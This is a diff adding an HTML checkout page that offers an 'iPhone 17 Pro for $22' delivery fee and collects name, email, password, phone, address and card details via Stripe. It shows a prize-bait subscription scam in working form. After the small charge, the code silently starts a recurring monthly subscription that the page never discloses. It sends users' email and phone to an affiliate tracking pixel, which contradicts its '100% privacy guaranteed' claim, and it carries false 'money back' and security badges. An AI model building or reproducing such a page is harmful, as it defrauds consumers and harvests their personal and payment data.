@@ -1,0 +1,401 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<!-- Google tag (gtag.js) -->
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-FDQ6REQWS8"></script>
+<script>
+  window.dataLayer = window.dataLayer || [];
+  function gtag(){dataLayer.push(arguments);} 
+  gtag('js', new Date());
+  gtag('config', 'G-FDQ6REQWS8');
+</script>
+<meta charset="utf-8" />
+<meta name="viewport" content="width=device-width,initial-scale=1, viewport-fit=cover" />
+<title>Secure Payment • Survey Style</title>
+<link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600;800;900&display=swap" rel="stylesheet"/>
+<style>
+  :root{
+    --brand:#0f6bd6; /* from survey1-za */
+    --ink:#000;
+    --radius:18px;
+    --line:rgba(0,0,0,.1);
+  }
+  *{box-sizing:border-box}
+  html,body{height:100%}
+  body{
+    margin:0;
+    font:16px/1.5 system-ui,-apple-system,"Segoe UI",Roboto,Arial;
+    color:var(--ink);
+    background:url("background.png") center/cover no-repeat fixed; /* same bg */
+    display:flex;
+    flex-direction:column;
+    align-items:center;
+    min-height:100vh;
+    color-scheme: light; /* FIX: avoid auto-dark inversion making options unreadable */
+  }
+  /* Top full-width image bar (same header art) */
+  .topbar{ position:sticky; top:0; left:0; width:100%; z-index:5 }
+  .topbar img{ width:100%; height:auto; display:block }
+
+  /* Page shell */
+  .wrap{ width:100%; max-width:860px; padding:20px 16px 40px; }
+  .card{
+    background:rgba(255,255,255,0.92);
+    border-radius:var(--radius);
+    box-shadow:0 10px 28px rgba(17,24,39,.15);
+    padding:24px;
+  }
+  .title{ margin:0 0 6px; font-size:24px; font-weight:800 }
+  .sub{ margin:0 0 16px; color:#111 }
+
+  /* Step handling */
+  .step{ display:none }
+  .step[aria-hidden="false"]{ display:block }
+
+  .grid{ display:grid; grid-template-columns:1fr 1fr; gap:12px }
+  @media (max-width:640px){ .grid{ grid-template-columns:1fr } }
+
+  .input,.el,select{ width:100%; padding:12px 14px; border:2px solid var(--line); border-radius:12px; background:#fff; color:#000 }
+  .input:focus,.el:focus,select:focus{ outline:none; border-color:#7fb3ff; box-shadow:0 0 0 3px rgba(15,107,214,.2) }
+
+  /* FIX: ensure native menu stays readable and above other UI */
+  select{
+    background-color:#fff; color:#000;
+    appearance:auto; -webkit-appearance:menulist;
+    position:relative; z-index:10; line-height:1.3;
+  }
+  option{ background:#fff; color:#000; }
+
+  .btn{ appearance:none; border:2px solid #000; background:#fff; color:#000; padding:12px 18px; border-radius:12px; cursor:pointer; font-weight:800; transition:.2s }
+  .btn:hover{ background:#000; color:#fff }
+  .btn.primary{ background:var(--brand); color:#fff; border-color:var(--brand) }
+  .btn.primary:hover{ background:#094da2 }
+  .btn-row{ display:flex; gap:12px; margin-top:12px; flex-wrap:wrap }
+
+  .brands{ display:flex; justify-content:center; gap:12px; margin:14px 0 6px }
+  .brands img{ height:22px }
+  .muted{ color:#222; font-size:14px }
+
+  .el{ background:#fff; border:2px solid var(--line); border-radius:10px }
+
+  /* loading */
+  .loading-overlay{ position:fixed; inset:0; background:rgba(0,0,0,.65); display:none; align-items:center; justify-content:center; z-index:100 }
+  .loading-overlay[aria-hidden="false"]{ display:flex }
+  .loading-box{ background:rgba(255,255,255,0.95); border-radius:16px; max-width:560px; width:92vw; padding:22px; text-align:center; box-shadow:0 10px 28px rgba(0,0,0,.3) }
+  .loading-title{ font-weight:800; margin:0 0 10px }
+  .progress{ width:100%; height:12px; border-radius:999px; background:rgba(0,0,0,0.1); overflow:hidden }
+  .bar{ height:100%; width:0; background:linear-gradient(90deg,var(--brand),#67b3ff); border-radius:inherit; animation:load 2.2s ease-in-out infinite }
+  @keyframes load{ 0%{width:0%} 60%{width:80%} 100%{width:100%} }
+
+  #err{ margin-top:10px; font-size:14px; color:#b00020; background:#fde9eb; border:1px solid #e5b2b8; border-radius:10px; padding:8px; display:none }
+  #err[aria-hidden="false"]{ display:block }
+</style>
+
+<!-- GoAffPro loader (keep this so the next page can track) -->
+<script src="https://api.goaffpro.com/loader.js?shop=nzyvwvfbde" type="text/javascript"></script>
+</head>
+<body>
+  <!-- Full-width header as in survey -->
+  <div class="topbar"><img src="bar1.png" alt="Top bar graphic"></div>
+
+  <div class="wrap">
+    <section id="step1" class="card step" aria-hidden="false">
+      <h1 class="title">Get your iPhone 17 Pro for <span data-price>$22</span>!</h1>
+      <p class="sub">Settle your delivery fee.</p>
+      <div class="grid">
+        <input class="input" id="nameInput" placeholder="Full name" autocomplete="name" required />
+        <input class="input" id="emailInput" type="email" placeholder="you@example.com" autocomplete="email" required />
+        <input class="input" id="passwordInput" type="password" placeholder="Create a password" autocomplete="new-password" required />
+        <div class="grid" style="grid-template-columns:160px 1fr; gap:10px">
+          <select id="phonePrefix" class="input" aria-label="Country calling code"></select>
+          <input id="phoneNumber" class="input" inputmode="tel" placeholder="Phone number" autocomplete="tel-national" />
+        </div>
+      </div>
+      <div class="btn-row">
+        <button class="btn primary" id="nextBtn">Next step →</button>
+      </div>
+      <p class="muted">We’ll never share your email. 100% privacy guaranteed.</p>
+    </section>
+
+    <section id="step2" class="card step" aria-hidden="true">
+      <h2 class="title">Secure Payment</h2>
+      <p class="sub">Your details are safe — powered by Stripe.</p>
+
+      <div class="grid">
+        <div>
+          <div class="muted">Street address</div>
+          <input id="billingStreet" class="input" placeholder="Street address" autocomplete="address-line1"/>
+        </div>
+        <div>
+          <div class="muted">City</div>
+          <input id="billingCity" class="input" placeholder="City" autocomplete="address-level2"/>
+        </div>
+        <div>
+          <div class="muted">Post Code</div>
+          <input id="billingPostcode" class="input" placeholder="Post Code" autocomplete="postal-code"/>
+        </div>
+        <div>
+          <div class="muted">Country</div>
+          <select id="billingCountry" class="input" autocomplete="country"></select>
+        </div>
+      </div>
+
+      <!-- Lead pixel (hidden until step 2 is shown) -->
+      <img id="leadPixel" src="" width="1" height="1" style="display:none" alt=""/>
+
+      <div class="muted" style="margin-top:10px">Card number</div>
+      <div id="card-number" class="el"></div>
+
+      <div class="grid" style="margin-top:10px">
+        <div>
+          <div class="muted">Expiration</div>
+          <div id="card-expiry" class="el"></div>
+        </div>
+        <div>
+          <div class="muted">CVC</div>
+          <div id="card-cvc" class="el"></div>
+        </div>
+      </div>
+
+      <div id="err" role="alert" aria-hidden="true"></div>
+
+      <div class="btn-row">
+        <button class="btn" id="backBtn">← Back</button>
+        <button class="btn primary" id="payNow">Pay <span data-price>$22</span> Securely</button>
+      </div>
+
+      <div class="brands">
+        <img src="https://upload.wikimedia.org/wikipedia/commons/0/04/Visa.svg" alt="Visa"/>
+        <img src="https://charmr.xyz/logos/mc2.png" alt="Mastercard"/>
+        <img src="https://charmr.xyz/logos/amex.png" alt="Amex"/>
+        <img src="https://www.gstatic.com/instantbuy/svg/dark_gpay.svg" alt="Google Pay"/>
+      </div>
+      <p class="muted">🔒 256-bit SSL Secured · Powered by Stripe · 30-Day Money Back Guarantee</p>
+    </section>
+  </div>
+
+  <!-- Loading overlay -->
+  <div id="loading-overlay" class="loading-overlay" aria-hidden="true">
+    <div class="loading-box">
+      <div class="loading-title">Processing your payment…</div>
+      <div class="progress"><div class="bar"></div></div>
+      <p class="muted">Please wait, this may take a few seconds.</p>
+    </div>
+  </div>
+
+  <!-- Stripe.js -->
+  <script src="https://js.stripe.com/v3"></script>
+  <script>
+    /* ---------- Step navigation ---------- */
+    const API_BASE = (() => {
+      if (location.protocol.startsWith('http')) return location.origin;
+      return "http://localhost:10000";
+    })();
+
+    const step1=document.getElementById('step1'),step2=document.getElementById('step2');
+    const nameInput=document.getElementById('nameInput');
+    const emailInput=document.getElementById('emailInput');
+    const passwordInput=document.getElementById('passwordInput');
+    const phonePrefix=document.getElementById('phonePrefix');
+    const phoneNumber=document.getElementById('phoneNumber');
+
+    const billingStreet   = document.getElementById('billingStreet');
+    const billingCity     = document.getElementById('billingCity');
+    const billingPostcode = document.getElementById('billingPostcode');
+    const billingCountry  = document.getElementById('billingCountry');
+
+    let leadPixelFired = false;
+
+    async function ensureAccount(){
+      const email=(emailInput.value||'').trim();
+      const password=(passwordInput.value||'').trim();
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const prefix=(phonePrefix?.value||'+1').trim();
+      const phone = rawPhone ? `${prefix}${rawPhone}` : '';
+      if(!email || !password) throw new Error("Please enter email and password.");
+      try{
+        const res=await fetch(`${API_BASE}/api/register`,{
+          method:"POST",
+          headers:{"Content-Type":"application/json"},
+          body:JSON.stringify({email,password,phone})
+        });
+        if(res.status===201) return true;
+        let data={}; try{ data=await res.json(); }catch{}
+        if(res.status===400 && /exists/i.test(data?.error||"")) return true;
+        console.warn("Proceeding despite register response:", data);
+        return true;
+      }catch(err){ console.warn("Register skipped (offline/dev):", err); return true; }
+    }
+
+    document.getElementById('nextBtn').onclick=async()=>{ 
+      if(!nameInput.value||!emailInput.value||!passwordInput.value){
+        alert("Please enter your details");
+        return;
+      }
+      try{ await ensureAccount(); }catch(e){ console.warn("ensureAccount error (continuing):", e); }
+      localStorage.setItem("checkout_name",nameInput.value);
+      localStorage.setItem("checkout_email",emailInput.value);
+      step1.setAttribute("aria-hidden","true");
+      step2.setAttribute("aria-hidden","false");
+
+      // Fire lead pixel once at step 2
+      if(!leadPixelFired){
+        try{
+          var email = encodeURIComponent((emailInput.value||'').trim());
+          var rawPhone = (phoneNumber && phoneNumber.value ? phoneNumber.value.replace(/[^0-9]/g,'') : '');
+          var prefix = (phonePrefix && phonePrefix.value ? phonePrefix.value.trim() : '');
+          var tx = email + '|' + (prefix + rawPhone);
+          var url = 'https://cudsr.bemobtrcks.com/conversion.gif?cid=OPTIONAL&payout=OPTIONAL&txid=' + encodeURIComponent(tx);
+          var px = document.getElementById('leadPixel');
+          if(px){ px.src = url; px.removeAttribute('style'); }
+          leadPixelFired = true;
+        }catch(_e){}
+      }
+    };
+
+    document.getElementById('backBtn').onclick=()=>{ 
+      step1.setAttribute("aria-hidden","false");
+      step2.setAttribute("aria-hidden","true");
+    };
+
+    /* ---------- Calling codes ---------- */
+    const CALLING_CODES = { ZA:{code:'+27',name:'South Africa'}, US:{code:'+1',name:'United States'}, CA:{code:'+1',name:'Canada'}, GB:{code:'+44',name:'United Kingdom'}, IE:{code:'+353',name:'Ireland'}, AU:{code:'+61',name:'Australia'}, NZ:{code:'+64',name:'New Zealand'}, DE:{code:'+49',name:'Germany'}, FR:{code:'+33',name:'France'}, ES:{code:'+34',name:'Spain'}, IT:{code:'+39',name:'Italy'}, NL:{code:'+31',name:'Netherlands'}, SE:{code:'+46',name:'Sweden'}, NO:{code:'+47',name:'Norway'}, DK:{code:'+45',name:'Denmark'}, FI:{code:'+358',name:'Finland'}, BE:{code:'+32',name:'Belgium'}, AT:{code:'+43',name:'Austria'}, CH:{code:'+41',name:'Switzerland'}, PT:{code:'+351',name:'Portugal'}, PL:{code:'+48',name:'Poland'}, RO:{code:'+40',name:'Romania'}, CZ:{code:'+420',name:'Czechia'}, SK:{code:'+421',name:'Slovakia'}, HU:{code:'+36',name:'Hungary'}, GR:{code:'+30',name:'Greece'} };
+
+    function buildPrefixOptions(selectEl, preferCode){
+      if(!selectEl) return;
+      selectEl.innerHTML="";
+      const entries=Object.entries(CALLING_CODES);
+      const prefer=CALLING_CODES[preferCode]?preferCode:'US';    /* FIX: safer universal default */
+      const first=CALLING_CODES[prefer]||CALLING_CODES.US;
+      // Put preferred first and selected
+      selectEl.append(new Option(`${first.code} — ${first.name}`, first.code, true, true));
+      const seen=new Set([first.code]);
+      for(const [,data] of entries){
+        if(seen.has(data.code)) continue;
+        selectEl.append(new Option(`${data.code} — ${data.name}`, data.code));
+        seen.add(data.code);
+      }
+      if(!selectEl.value) selectEl.value=first.code;
+    }
+
+    // --- FIX: robust, fast IP country lookup with timeout & fallbacks
+    async function fetchWithTimeout(url, ms=2500){
+      const ctrl = new AbortController();
+      const t = setTimeout(()=>ctrl.abort(), ms);
+      try{
+        const res = await fetch(url, {signal: ctrl.signal});
+        return res;
+      }finally{
+        clearTimeout(t);
+      }
+    }
+    async function detectCountryCodeFromIP(){
+      // 1) GeoJS (very reliable, no key)
+      try{
+        const r = await fetchWithTimeout('https://get.geojs.io/v1/ip/country.json');
+        if(r && r.ok){
+          const j = await r.json();
+          if(j && typeof j.country === 'string' && j.country.length===2){
+            return j.country.toUpperCase();
+          }
+        }
+      }catch(_){}
+      // 2) ipapi.co
+      try{
+        const r = await fetchWithTimeout('https://ipapi.co/json/');
+        if(r && r.ok){
+          const j = await r.json();
+          if(j && typeof j.country_code === 'string' && j.country_code.length===2){
+            return j.country_code.toUpperCase();
+          }
+        }
+      }catch(_){}
+      // 3) ipwho.is
+      try{
+        const r = await fetchWithTimeout('https://ipwho.is/');
+        if(r && r.ok){
+          const j = await r.json();
+          if(j && j.success !== false && typeof j.country_code === 'string'){
+            return j.country_code.toUpperCase();
+          }
+        }
+      }catch(_){}
+      // 4) Last-ditch: try browser locale (e.g., en-US)
+      try{
+        const loc = (navigator.languages && navigator.languages[0]) || navigator.language || '';
+        const m = /-([A-Z]{2})$/i.exec(loc);
+        if(m) return m[1].toUpperCase();
+      }catch(_){}
+      return 'US';
+    }
+
+    // Populate immediately so control is visible, then refine with detected country
+    buildPrefixOptions(phonePrefix,'US');
+
+    /* ---------- Prefill country and price symbol (minimal) ---------- */
+    (function setInitial(){
+      document.querySelectorAll('[data-price]').forEach(el=> el.textContent='$22');
+      if(billingCountry){
+        ['ZA','US','GB','IE','DE','FR','ES','IT','NL','AU','CA'].forEach((cc,i)=>{
+          const names={ZA:'South Africa',US:'United States',GB:'United Kingdom',IE:'Ireland',DE:'Germany',FR:'France',ES:'Spain',IT:'Italy',NL:'Netherlands',AU:'Australia',CA:'Canada'};
+          billingCountry.appendChild(new Option(names[cc], cc, i===0, i===0));
+        });
+      }
+    })();
+
+    // Apply detected country to prefix (and billing dropdown if available)
+    (async ()=>{
+      const cc = await detectCountryCodeFromIP();   // e.g., "GB"
+      buildPrefixOptions(phonePrefix, cc);
+      if(billingCountry){
+        const opt = Array.from(billingCountry.options).find(o => o.value === cc);
+        if(opt) billingCountry.value = cc;
+      }
+    })();
+
+    /* ---------- Stripe logic (from existing payment pages) ---------- */
+    const SUBSCRIBE_URL = "https://charmr-jfmc.onrender.com/api/stripe/intro-charge-1250"; // same endpoint variant
+    const PUBLISHABLE_KEY = "pk_live_51Rhm4sEJXIhiKzYGIPVjXwZTzuKmqU7EOA6EpDIkrNTmtm4ooWHbDcSaBlyglSdJYhCyU4VgcI8Qo09Acc8upCUD00ekSRuN4q";
+    const MONTHLY_PRICE_ID = "price_1RvJmqEJXIhiKzYGE0IJQp7t";
+
+    const stripe = Stripe(PUBLISHABLE_KEY), elements = stripe.elements();
+    const cardNumber=elements.create("cardNumber"), cardExpiry=elements.create("cardExpiry"), cardCvc=elements.create("cardCvc");
+    cardNumber.mount("#card-number"); cardExpiry.mount("#card-expiry"); cardCvc.mount("#card-cvc");
+
+    const $err=document.getElementById("err"), overlay=document.getElementById("loading-overlay");
+    function showError(m){ $err.textContent=m; $err.style.display="block"; $err.setAttribute('aria-hidden','false'); }
+    function hideError(){ $err.textContent=""; $err.style.display="none"; $err.setAttribute('aria-hidden','true'); }
+    function showLoading(){ overlay.setAttribute("aria-hidden","false"); }
+    function hideLoading(){ overlay.setAttribute("aria-hidden","true"); }
+
+    document.getElementById("payNow").onclick = async () => {
+      hideError(); showLoading();
+      const rawPhone=(phoneNumber?.value||'').replace(/[^\d]/g,'');
+      const prefix=(phonePrefix?.value||'+1').trim(); /* FIX: stays aligned with detected default */
+      const fullPhone = rawPhone ? `${prefix}${rawPhone}` : undefined;
+      const addr = { line1:(billingStreet?.value||'').trim()||undefined, city:(billingCity?.value||'').trim()||undefined, postal_code:(billingPostcode?.value||'').trim()||undefined, country:(billingCountry?.value||'').trim()||undefined };
+
+      const pm = await stripe.createPaymentMethod({ type:"card", card:cardNumber, billing_details:{ name:nameInput.value||undefined, email:emailInput.value||undefined, phone:fullPhone, address:addr } });
+      if(pm.error){ hideLoading(); showError(pm.error.message); return; }
+
+      try{
+        const res = await fetch(SUBSCRIBE_URL,{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ paymentMethodId:pm.paymentMethod.id, name:nameInput.value, email:emailInput.value, phone:fullPhone, address:addr }) });
+        const data = await res.json();
+        if(data.error){ hideLoading(); showError(data.error); return; }
+        if(!data.clientSecret){ hideLoading(); showError("Payment failed"); return; }
+
+        const conf = await stripe.confirmCardPayment(data.clientSecret);
+        if(conf.error){ hideLoading(); showError(conf.error.message); return; }
+        if(!(conf.paymentIntent && conf.paymentIntent.status === "succeeded")){ hideLoading(); showError("Payment not completed"); return; }
+
+        const subRes = await fetch("https://charmr-jfmc.onrender.com/api/stripe/start-monthly-after-trial",{ method:"POST", headers:{"Content-Type":"application/json"}, body:JSON.stringify({ paymentIntentId:data.paymentIntentId, priceIdMonthly:MONTHLY_PRICE_ID }) });
+        const subData = await subRes.json();
+        if(subData.error){ hideLoading(); showError(subData.error); return; }
+
+        // Final redirect (your specified URL)
+        window.location.href = "https://cudsr.bemobtrcks.com/go/e1420adb-fbc5-4cfe-b0f1-10615c05e062?";
+      }catch(e){ hideLoading(); showError(e.message||"Something went wrong"); }
+    };
+  </script>
+</body>
+</html>
